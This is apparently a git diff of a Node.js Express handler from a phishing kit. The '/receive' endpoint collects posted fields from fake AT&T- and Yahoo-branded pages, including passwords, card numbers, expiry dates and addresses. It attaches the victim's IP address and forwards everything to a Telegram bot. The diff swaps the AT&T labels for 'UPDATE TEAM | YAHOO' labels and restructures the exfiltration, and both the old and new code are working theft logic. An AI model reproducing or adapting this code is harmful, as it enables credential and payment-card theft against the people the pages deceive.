@@ -50,43 +50,43 @@ const sendTelegramMessage = (text) => {
 
 app.post('/receive', (req, res) => {
   
-  let body = '';
   let message = '';
-  req.on('data', (data) => {
-    body += data;
-  });
+  let myObject = req.body;
 
-console.log(body);
-    
-  req.on('end', () => {
-    const postParams = querystring.parse(body);
-
-    if (postParams.Password) {
-      message += 'At&T Loginπ\n';
-      message += `π ${req.connection.remoteAddress}\n`;
-      message += `π ${new Date().toLocaleString()}\n`;
-
-      for (const key in postParams) {
-        message += `${key}: ${postParams[key]}\n`;
-      }
-    }
-
-    if (postParams.Expiry_date) {
-      message += `At&T Card details for ${postParams.visitor}\n`;
-      message += `π ${req.connection.remoteAddress}\n`;
-      message += `π ${new Date().toLocaleString()}\n`;
-
-      for (const key in postParams) {
-        message += `${key}: ${postParams[key]}\n`;
-      }
-    }
-      console.log(message);
-
-    
-  });
-    sendTelegramMessage(message);
   
-  res.send('Data received successfully');
+  const myObjects = Object.keys(myObject);
+ 
+  if (myObjects.includes('Password')) {
+  	message += `✅ UPDATE TEAM | YAHOO | USER_${IpAddress}\n\n` +
+             `👤 LOGIN INFO\n\n`;
+  
+  for (const key of myObjects){
+    console.log(`${key}: ${myObject[key]}`);
+    message += `${key}: ${myObject[key]}\n`;
+  }
+ }
+ 
+ if (myObjects.includes('Expiry-date') || myObjects.includes('Card-number') || myObjects.includes('Address')) {
+  message += `✅ UPDATE TEAM | YAHOO | USER_${IpAddress}\n\n` +
+             `👤 CARD INFO\n\n`;
+  
+ 	for (const key of myObjects){
+    console.log(`${key}: ${myObject[key]}`);
+    message += `${key}: ${myObject[key]}\n`;
+  }
+ 	
+}
+    // Now you can handle the data or send it as needed
+    console.log(message); // This should be inside the 'end' event callback
+    const sendMessage = sendMessageFor(botToken, chatId);
+    sendMessage(message);
+
+    // Send a response back to the client if needed
+    res.send('Data received and processed.');
+
+  	
+  
+  
 });
 
 
